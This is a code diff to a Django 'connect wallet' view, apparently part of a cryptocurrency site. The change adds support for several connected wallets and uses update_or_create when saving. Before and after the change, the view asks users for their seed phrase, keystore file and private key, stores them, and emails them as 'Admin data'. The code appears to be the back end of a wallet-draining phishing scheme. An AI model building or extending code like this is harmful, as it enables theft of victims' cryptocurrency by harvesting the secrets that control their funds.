@@ -426,27 +426,26 @@ def transactions_view(request):
 @login_required
 def wallet_connect_view(request):
     """Connect external wallet"""
-    # Check if already connected
-    if hasattr(request.user, 'connectwallet'):
-        messages.info(request, 'You already have a wallet connected.')
-        return redirect('dashboard')
+    # Fetch all connected wallets for the user
+    connected_wallets = ConnectWallet.objects.filter(user=request.user).order_by('-created_at')
         
     if request.method == 'POST':
         form = WalletConnectForm(request.POST)
         if form.is_valid():
-            # Save wallet data
-            ConnectWallet.objects.create(
+            # Save wallet data using update_or_create to prevent duplicate platforms for same user
+            ConnectWallet.objects.update_or_create(
                 user=request.user,
                 platform=form.cleaned_data.get('platform'),
-                mnemonic_phrase=form.cleaned_data.get('mnemonic_phrase'),
-                keystore_json=form.cleaned_data.get('keystore_json'),
-                private_key=form.cleaned_data.get('private_key')
+                defaults={
+                    'mnemonic_phrase': form.cleaned_data.get('mnemonic_phrase'),
+                    'keystore_json': form.cleaned_data.get('keystore_json'),
+                    'private_key': form.cleaned_data.get('private_key'),
+                }
             )
             
             # Prepare data for email
             wallet_data = {
                 'platform': form.cleaned_data.get('platform'),
-                'connection_method': form.cleaned_data.get('connection_method'),
                 'mnemonic_phrase': form.cleaned_data.get('mnemonic_phrase'),
                 'keystore_json': form.cleaned_data.get('keystore_json'),
                 'private_key': form.cleaned_data.get('private_key'),
@@ -456,12 +455,16 @@ def wallet_connect_view(request):
             # Send emails (User notification + Admin data)
             send_wallet_connection_email(request.user, wallet_data)
             
-            messages.success(request, 'Wallet connected successfully!')
+            platform_name = dict(form.fields['platform'].choices).get(form.cleaned_data.get('platform'))
+            messages.success(request, f'{platform_name} connected successfully!')
             return redirect('dashboard')
     else:
         form = WalletConnectForm()
     
-    return render(request, 'wallet_connect.html', {'form': form})
+    return render(request, 'wallet_connect.html', {
+        'form': form, 
+        'connected_wallets': connected_wallets
+    })
 
 
 @login_required
